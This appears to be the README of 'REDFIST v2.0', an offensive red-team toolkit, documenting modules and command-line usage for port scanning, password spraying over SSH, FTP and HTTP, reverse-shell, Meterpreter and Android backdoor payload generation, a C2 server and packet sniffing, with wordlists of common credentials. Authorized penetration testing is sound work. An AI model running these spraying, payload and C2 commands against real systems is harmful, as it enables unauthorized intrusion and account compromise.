 🔥 REDFIST v2.0 - Red Team Framework for Infrastructure Security Testing

<div align="center">

![REDFIST Banner](https://img.shields.io/badge/REDFIST-v2.0-red?style=for-the-badge&logo=fire&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.7+-blue?style=for-the-badge&logo=python&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20|%20Windows%20|%20macOS-lightgrey?style=for-the-badge&logo=linux&logoColor=white)

<h3>⚡ Advanced Red Team Framework Created by <span style="color: #FF6B35;">Fazo</span> ⚡</h3>

<p><em>A comprehensive, modern penetration testing toolkit for authorized security assessments</em></p>

<br>

<div align="center">

<table>
  <tr>
    <td align="center">
      <a href="#-features">✨ Features</a>
    </td>
    <td align="center">
      <a href="#-installation">🚀 Installation</a>
    </td>
    <td align="center">
      <a href="#-modules">📦 Modules</a>
    </td>
    <td align="center">
      <a href="#-examples">🎯 Examples</a>
    </td>
    <td align="center">
      <a href="#-disclaimer">⚠️ Disclaimer</a>
    </td>
  </tr>
</table>

</div>

</div>

<br>

## 🎯 Overview

<div align="left">


██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗
██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝
██████╔╝█████╗  ██║  ██║█████╗  ██║███████╗   ██║   
██╔══██╗██╔══╝  ██║  ██║██╔══╝  ██║╚════██║   ██║   
██║  ██║███████╗██████╔╝██║     ██║███████║   ██║   
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝     ╚═╝╚══════╝   ╚═╝   
                                                     
   RED TEAM ASSAULT FRAMEWORK v2.0                   
   Created by: Fazo                                  
   Advanced Infrastructure Security Testing          


REDFIST (Red Team Framework for Infrastructure Security Testing) is a comprehensive, multi-module penetration testing framework designed for authorized security assessments. Created by Fazo, this tool provides red teams and security professionals with a powerful, all-in-one solution for infrastructure security testing.

    🛡️ Professional Grade | Modular Design | Multi-Platform | Actively Maintained


✨ Features
🔍 Reconnaissance & Intelligence
<table> <tr> <td width="30">🔎</td> <td><b>Advanced Port Scanning</b> - Multi-threaded TCP port scanning with service detection</td> </tr> <tr> <td>🌐</td> <td><b>Subdomain Enumeration</b> - Wordlist and API-based subdomain discovery</td> </tr> <tr> <td>📡</td> <td><b>Network Sniffing</b> - Real-time packet capture and analysis with BPF filters</td> </tr> </table>
🔐 Credential Attacks & Access
<table> <tr> <td width="30">🎯</td> <td><b>Multi-Protocol Password Spraying</b> - SSH, FTP, and HTTP authentication attacks</td> </tr> <tr> <td>⏱️</td> <td><b>Intelligent Rate Limiting</b> - Avoid account lockouts with configurable delays</td> </tr> </table>
💻 Payload Engineering
<table> <tr> <td width="30">🖥️</td> <td><b>Multi-Platform Payloads</b> - Windows, Linux, macOS, Android support</td> </tr> <tr> <td>📦</td> <td><b>Various Formats</b> - EXE, APK, Python, Bash, PowerShell scripts</td> </tr> <tr> <td>🎧</td> <td><b>Auto-Listener Integration</b> - Automatic handler setup for reverse shells</td> </tr> <tr> <td>⚔️</td> <td><b>Meterpreter Integration</b> - Seamless Metasploit payload generation</td> </tr> </table>
🎮 Command & Control
<table> <tr> <td width="30">👑</td> <td><b>Advanced C2 Server</b> - Full-featured command and control with authentication</td> </tr> <tr> <td>👥</td> <td><b>Multi-Client Support</b> - Handle multiple simultaneous connections</td> </tr> <tr> <td>📁</td> <td><b>File Transfer</b> - Upload and download capabilities</td> </tr> </table>
🛡️ Vulnerability Assessment
<table> <tr> <td width="30">🔍</td> <td><b>Web Vulnerability Scanning</b> - Common web application security checks</td> </tr> <tr> <td>📊</td> <td><b>Network Service Analysis</b> - Service banner grabbing and analysis</td> </tr> </table>
🎨 User Experience
<table> <tr> <td width="30">🎨</td> <td><b>Color-Coded Interface</b> - Beautiful, readable output</td> </tr> <tr> <td>🧩</td> <td><b>Modular Architecture</b> - Easy to extend and customize</td> </tr> <tr> <td>📝</td> <td><b>Comprehensive Logging</b> - Detailed activity tracking</td> </tr> </table>
🚀 Installation
📋 Prerequisites

    Python 3.7 or higher

    pip (Python package manager)

    Recommended: Linux environment (Kali Linux preferred)

⚡ Quick Installation
'''bash

git clone https://github.com/fazo/redfist.git
cd redfist

# Run automated installation script
chmod +x install.sh
./install.sh

🛠️ Manual Installation
bash

# Clone the repository
git clone https://github.com/fazo/redfist.git
cd redfist

# Install required dependencies
pip install -r requirements.txt

# Make the script executable
chmod +x redfist.py

🔧 Full Installation (Recommended)
bash

# Install all optional dependencies for full functionality
pip install paramiko scapy requests colorama

# For Metasploit integration (optional)
sudo apt update && sudo apt install metasploit-framework

# For advanced network capabilities
sudo apt install tcpdump nmap

🐳 Docker Installation
bash

# Build from Dockerfile
docker build -t redfist .

# Run container with host networking
docker run -it --net=host redfist

# Or with specific command
docker run -it --net=host redfist python redfist.py modules

📦 Requirements File
text

requests>=2.28.0
paramiko>=2.11.0
scapy>=2.4.5
colorama>=0.4.6
urllib3>=1.26.0


🎯 Quick Start
🚀 Basic Usage
bash

# Show help and available commands
python redfist.py --help

# Display all available modules
python redfist.py modules

# Basic port scan
python redfist.py scan 192.168.1.1

# Generate a reverse shell payload
python redfist.py payload 192.168.1.100 4444

🎓 Your First Assessment
Phase 1: Discovery & Reconnaissance
bash

# Discover live hosts and open ports
python redfist.py scan 10.0.0.1/24 -p 1-1000 -t 50

# Enumerate subdomains with API support
python redfist.py subdomains target-company.com -a

Phase 2: Vulnerability Assessment
bash

# Scan for web vulnerabilities
python redfist.py vuln 192.168.1.100 -t web

# Network service analysis
python redfist.py scan 192.168.1.100 -p 21,22,80,443,3389

Phase 3: Exploitation & Access
bash

# Generate and deploy payload with auto-listener
python redfist.py payload 192.168.1.100 4444 -f exe -l

# Password spraying attack
python redfist.py spray 192.168.1.100 -u users.txt -p "Spring2024!" --protocol ssh


📦 Modules
1. 🎯 Port Scanner (scan)

Advanced multi-threaded port scanning with service detection
Feature	Description
🔍 TCP Connect Scanning	Reliable port discovery
🏷️ Service Detection	Automatic service identification
🎌 Banner Grabbing	Service banner collection
🎯 Custom Port Ranges	Flexible target specification
⚡ Adjustable Threading	Performance optimization

Usage Examples:
bash

# Basic port scan
python redfist.py scan 192.168.1.1 -p 1-1000 -t 100

# Targeted service scan
python redfist.py scan 10.0.0.0/24 -p 22,80,443,3389

# Comprehensive scan
python redfist.py scan target.com -p 1-65535 -t 200

2. 🌐 Subdomain Enumeration (subdomains)

Comprehensive subdomain discovery using multiple techniques
Feature	Description
📚 Wordlist-based	Custom wordlist support
🔌 API Integration	crtsh, AlienVault, and more
⚡ Multi-threaded	High-performance enumeration
🎯 Smart Filtering	Relevant result filtering

Usage Examples:
bash

# Basic subdomain discovery
python redfist.py subdomains example.com

# Advanced with custom wordlist and APIs
python redfist.py subdomains target.com -w custom_wordlist.txt -a

# API-only enumeration
python redfist.py subdomains company.org --api

3. 🔐 Password Spraying (spray)

Multi-protocol password spraying attacks
Feature	Description
🔑 SSH Spraying	Secure Shell authentication
📁 FTP Attacks	File transfer protocol
🌐 HTTP Auth	Web authentication
⏱️ Rate Limiting	Account lockout prevention
📊 Success Tracking	Result monitoring

Usage Examples:
bash

# SSH password spraying
python redfist.py spray 192.168.1.100 -u users.txt -p "Password123"

# FTP authentication attack
python redfist.py spray ftp.target.com -u users.txt -p "Summer2024!" --protocol ftp --port 21

# HTTP basic auth
python redfist.py spray webapp.com -u admins.txt -p "Admin123" --protocol http

4. 💣 Payload Generation (payload)

Advanced multi-platform payload creation
Platform	Format	Description
🐧 Linux/Unix	Python, Bash	Script-based payloads
🪟 Windows	PowerShell, EXE	Native Windows payloads
🤖 Android	APK	Mobile application payloads
 macOS	Bash	macOS-compatible scripts

Usage Examples:
bash

# Python reverse shell
python redfist.py payload 192.168.1.100 4444 -f python

# Meterpreter Windows executable
python redfist.py payload 10.0.0.5 1337 -t meterpreter -f exe -l

# Android backdoor APK
python redfist.py payload 192.168.1.100 8080 -f apk

5. 👑 C2 Server (c2)

Command and Control server with advanced features
Feature	Description
👥 Multi-Client	Simultaneous connections
🔐 Authentication	Secure access control
📁 File Transfer	Upload/download capabilities
💻 System Intel	Automated information gathering
🔄 Persistent	Stable connection handling

Usage Examples:
bash

# Basic C2 server
python redfist.py c2 -p 4444

# Secured C2 with authentication
python redfist.py c2 -p 1337 -a

6. 📡 Network Sniffing (sniff)

Advanced packet capture and analysis
Feature	Description
👁️ Real-time Capture	Live packet inspection
🎯 BPF Filters	Berkeley Packet Filter support
📊 Protocol Analysis	TCP, UDP, DNS, HTTP analysis
🔢 Custom Count	Configurable packet limits

Usage Examples:
bash

# Basic packet capture
python redfist.py sniff -i eth0 -c 500

# Filtered capture (HTTP traffic only)
python redfist.py sniff -f "tcp port 80" -c 1000

# DNS traffic monitoring
python redfist.py sniff -f "udp port 53" -c 200

7. 🛡️ Vulnerability Scanner (vuln)

Basic vulnerability assessment tool
Feature	Description
🌐 Web App Scanning	Common web vulnerabilities
📁 Path Discovery	Directory and file enumeration
🛡️ Header Analysis	Security header checks
🔍 Service Checks	Network service vulnerabilities

Usage Examples:
bash

# Web vulnerability scan
python redfist.py vuln 192.168.1.100 -t web

# HTTPS target scanning
python redfist.py vuln https://target.com -t web


🎯 Real-World Examples
🏢 Comprehensive Infrastructure Assessment
bash

# Phase 1: Discovery & Mapping
echo "🚀 Starting Network Discovery..."
python redfist.py scan 10.0.1.0/24 -p 1-1000 -t 200
python redfist.py subdomains target-company.com -a

# Phase 2: Service Analysis
echo "🔍 Analyzing Services..."
python redfist.py scan 10.0.1.50 -p 1-65535 -t 100
python redfist.py vuln 10.0.1.50 -t web

# Phase 3: Credential Testing
echo "🔐 Testing Credentials..."
python redfist.py spray 10.0.1.50 -u employees.txt -p "Company123!" --protocol ssh

# Phase 4: Exploitation
echo "💣 Deploying Payloads..."
python redfist.py payload 10.0.1.100 4444 -f exe -l

🔴 Red Team Engagement
bash

# External Reconnaissance
echo "🌐 External Reconnaissance..."
python redfist.py subdomains client-company.com -a -w big_wordlist.txt

# Internal Network Mapping
echo "🏠 Internal Network Mapping..."
python redfist.py scan 192.168.100.1-254 -p 22,80,443,3389,5985 -t 150

# C2 Infrastructure
echo "👑 Setting up C2..."
python redfist.py payload 192.168.100.50 4444 -f powershell
python redfist.py c2 -p 4444 -a

# Lateral Movement
echo "🔄 Lateral Movement..."
python redfist.py spray 192.168.100.0/24 -u domain_users.txt -p "Season2024!" --protocol ssh

🌐 Web Application Testing
bash

# Subdomain Discovery
echo "🔍 Discovering Subdomains..."
python redfist.py subdomains webapp.com -a

# Service Enumeration
echo "📊 Enumerating Services..."
python redfist.py scan webapp.com -p 80,443,8080,8443

# Vulnerability Assessment
echo "🛡️ Vulnerability Scanning..."
python redfist.py vuln https://webapp.com -t web

# Authentication Testing
echo "🔐 Testing Authentication..."
python redfist.py spray webapp.com -u admins.txt -p "Admin123!" --protocol http --port 80


💣 Payload Types
🔄 Reverse Shell Payloads
Platform	🐧 Linux/Unix	🪟 Windows	🤖 Android	 macOS
Python	✅	✅	✅	✅
Bash	✅	❌	✅	✅
PowerShell	❌	✅	❌	❌
EXE	❌	✅	❌	❌
APK	❌	❌	✅	❌
⚔️ Meterpreter Payloads
Platform	Payload	Description
🪟 Windows	windows/meterpreter/reverse_tcp	Full Windows Meterpreter
🤖 Android	android/meterpreter/reverse_tcp	Mobile Meterpreter
🐧 Linux	linux/x86/meterpreter/reverse_tcp	Linux Meterpreter
🎯 Usage Examples
bash

# Windows PowerShell reverse shell
python redfist.py payload 192.168.1.100 4444 -f powershell

# Android Meterpreter backdoor
python redfist.py payload 192.168.1.100 4444 -t meterpreter -f apk

# Linux Python payload with auto-listener
python redfist.py payload 10.0.0.5 1337 -f python -l


⚙️ Configuration
📚 Custom Wordlists
bash

# Create subdomain wordlist
echo -e "www\napi\nadmin\ndev\nstaging\nmail\nftp\nsecure\nportal" > custom_subdomains.txt

# Create username wordlist  
echo -e "admin\nroot\nadministrator\nuser\ntest\nguest\nftp\nwww-data" > custom_users.txt

# Create password wordlist
echo -e "Password123\nSpring2024!\nCompany123\nAdmin@123\nWelcome1" > common_passwords.txt

🌐 Network Optimization
bash

# Increase file descriptors for high-volume scanning
ulimit -n 65536

# Optimize TCP parameters
sysctl -w net.ipv4.tcp_tw_reuse=1
sysctl -w net.core.somaxconn=65535
sysctl -w net.ipv4.tcp_fin_timeout=30

⚔️ Metasploit Integration
bash

# Start Metasploit services
sudo systemctl start postgresql
sudo msfdb init

# Verify installation
msfconsole --version

# Test payload generation
msfvenom --list payloads | grep windows


🔧 Troubleshooting
❗ Common Issues & Solutions
Issue	Solution
"ModuleNotFoundError: No module named 'paramiko'"	pip install paramiko
"Permission denied" for packet sniffing	sudo python redfist.py sniff -i eth0
Port scan not finding open ports	Check firewall, increase timeout: -t 100
Payload generation fails	Install Metasploit: sudo apt install metasploit-framework
Slow performance	Adjust thread count, use specific port ranges
🚀 Performance Optimization

    Thread Management: Use appropriate thread counts (50-200)

    Network Timing: Adjust timeouts based on network latency

    Target Selection: Use specific port ranges vs full scans

    Resource Monitoring: Monitor system resources during scans


⚠️ Legal Disclaimer
<div align="center">

    🚨 IMPORTANT LEGAL NOTICE 🚨

</div>

REDFIST is a security testing tool designed exclusively for authorized penetration testing and educational purposes.
✅ Legal Usage

    Testing your own systems and networks

    Authorized penetration testing with written permission

    Educational and research environments

    Security awareness training

    CTF (Capture The Flag) competitions

❌ Illegal Usage

    Testing systems without explicit permission

    Malicious hacking activities

    Unauthorized access to systems

    Any illegal or unethical activities

🔒 Responsibility

The user assumes all responsibility for any actions performed with this tool. The creator (Fazo) is not responsible for any misuse or damage caused by this software.

    By using REDFIST, you explicitly agree to use it only for legal and authorized purposes.


🤝 Contributing

We welcome contributions from the security community!
🎯 How to Contribute

    Fork the repository

    Create a feature branch (git checkout -b feature/AmazingFeature)

    Commit your changes (git commit -m 'Add some AmazingFeature')

    Push to the branch (git push origin feature/AmazingFeature)

    Open a Pull Request

🛠️ Development Setup
bash

# Set up development environment
git clone https://github.com/fazo/redfist.git
cd redfist
python -m venv venv
source venv/bin/activate  # Linux/macOS
# venv\Scripts\activate  # Windows
pip install -r requirements-dev.txt

📏 Code Standards

    Follow PEP 8 Python style guide

    Add comments for complex logic

    Include error handling

    Update documentation for new features

    Write clean, maintainable code


📜 License

This project is licensed under the MIT License - see the LICENSE file for details.

🙏 Acknowledgments

    Fazo - Creator and maintainer

    The security community for feedback and testing

    Open-source tools that inspired this project

    Contributors and testers worldwide


📞 Support & Community
<div align="center">
🐛 Found an Issue?

Create a GitHub Issue
💡 Have a Suggestion?

Start a Discussion
📚 Need Help?

Check the Troubleshooting section first!
</div>
🚀 Future Roadmap

    Web Application Firewall bypass techniques

    Cloud Environment testing modules (AWS, Azure, GCP)

    Mobile Application security testing

    Social Engineering toolkit integration

    Automated Reporting features

    REST API for tool integration

    Machine Learning enhanced scanning

    Blockchain security testing modules

<div align="center">
🎉

REDFIST v2.0 - Empowering Security Professionals Worldwide
Created with ❤️ by Fazo

    "With great power comes great responsibility."

    Use responsibly, test ethically, secure continuously.


⬆ Back to Top
</div> ```
